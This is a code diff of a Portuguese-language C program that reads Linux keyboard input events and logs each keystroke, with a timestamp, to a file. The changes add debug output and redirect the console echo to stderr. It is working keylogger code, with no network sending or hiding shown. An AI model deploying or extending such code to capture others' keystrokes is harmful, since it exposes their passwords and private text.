@@ -105,16 +105,19 @@ int main() {
                 char horario[20];
                 pegar_horario(horario, sizeof(horario));
                 
+                fprintf(stderr, "DEBUG: e.code=%d, teclas[e.code]=%d, value=%d\n", e.code, (e.code < 200 ? teclas[e.code] : -1), e.value);
+                fflush(stderr);
+                
                 // tenta converter tecla normal
-                if(e.code < 128 && teclas[e.code] != 0) {
+                if(e.code < 200 && teclas[e.code] != 0) {
                     char letra = teclas[e.code];
                     
                     if(shift == 1 && letra >= 'a' && letra <= 'z') {
                         letra = letra - 32;
                     }
                     
-                    printf("[%s] Tecla: '%c'\n", horario, letra);
-                    fflush(stdout);
+                    fprintf(stderr, "[%s] Tecla: '%c'\n", horario, letra);
+                    fflush(stderr);
                     fprintf(log, "[%s] '%c'\n", horario, letra);
                 }
                 else {
@@ -124,63 +127,63 @@ int main() {
                     switch(e.code) {
                         case 28:
                             nome_tecla = "ENTER";
-                            printf("[%s] Tecla: ENTER\n", horario);
-                            fflush(stdout);
+                            fprintf(stderr, "[%s] Tecla: ENTER\n", horario);
+                            fflush(stderr);
                             break;
                         case 14:
                             nome_tecla = "BACKSPACE";
-                            printf("[%s] Tecla: BACKSPACE\n", horario);
-                            fflush(stdout);
+                            fprintf(stderr, "[%s] Tecla: BACKSPACE\n", horario);
+                            fflush(stderr);
                             break;
                         case 57:
                             nome_tecla = "ESPACO";
-                            printf("[%s] Tecla: ESPACO\n", horario);
-                            fflush(stdout);
+                            fprintf(stderr, "[%s] Tecla: ESPACO\n", horario);
+                            fflush(stderr);
                             break;
                         case 15:
                             nome_tecla = "TAB";
-                            printf("[%s] Tecla: TAB\n", horario);
-                            fflush(stdout);
+                            fprintf(stderr, "[%s] Tecla: TAB\n", horario);
+                            fflush(stderr);
                             break;
                         case 1:
                             nome_tecla = "ESC";
-                            printf("[%s] Tecla: ESC\n", horario);
-                            fflush(stdout);
+                            fprintf(stderr, "[%s] Tecla: ESC\n", horario);
+                            fflush(stderr);
                             break;
                         case 103:
                             nome_tecla = "SETA_CIMA";
-                            printf("[%s] Tecla: SETA_CIMA\n", horario);
-                            fflush(stdout);
+                            fprintf(stderr, "[%s] Tecla: SETA_CIMA\n", horario);
+                            fflush(stderr);
                             break;
                         case 108:
                             nome_tecla = "SETA_BAIXO";
-                            printf("[%s] Tecla: SETA_BAIXO\n", horario);
-                            fflush(stdout);
+                            fprintf(stderr, "[%s] Tecla: SETA_BAIXO\n", horario);
+                            fflush(stderr);
                             break;
                         case 105:
                             nome_tecla = "SETA_ESQUERDA";
-                            printf("[%s] Tecla: SETA_ESQUERDA\n", horario);
-                            fflush(stdout);
+                            fprintf(stderr, "[%s] Tecla: SETA_ESQUERDA\n", horario);
+                            fflush(stderr);
                             break;
                         case 106:
                             nome_tecla = "SETA_DIREITA";
-                            printf("[%s] Tecla: SETA_DIREITA\n", horario);
-                            fflush(stdout);
+                            fprintf(stderr, "[%s] Tecla: SETA_DIREITA\n", horario);
+                            fflush(stderr);
                             break;
                         case 127:
                             nome_tecla = "DELETE";
-                            printf("[%s] Tecla: DELETE\n", horario);
-                            fflush(stdout);
+                            fprintf(stderr, "[%s] Tecla: DELETE\n", horario);
+                            fflush(stderr);
                             break;
                         case 58:
                             nome_tecla = "CAPS_LOCK";
-                            printf("[%s] Tecla: CAPS_LOCK\n", horario);
-                            fflush(stdout);
+                            fprintf(stderr, "[%s] Tecla: CAPS_LOCK\n", horario);
+                            fflush(stderr);
                             break;
                         default:
                             nome_tecla = "DESCONHECIDA";
-                            printf("[%s] Tecla: DESCONHECIDA[%d]\n", horario, e.code);
-                            fflush(stdout);
+                            fprintf(stderr, "[%s] Tecla: DESCONHECIDA[%d]\n", horario, e.code);
+                            fflush(stderr);
                             break;
                     }
                     
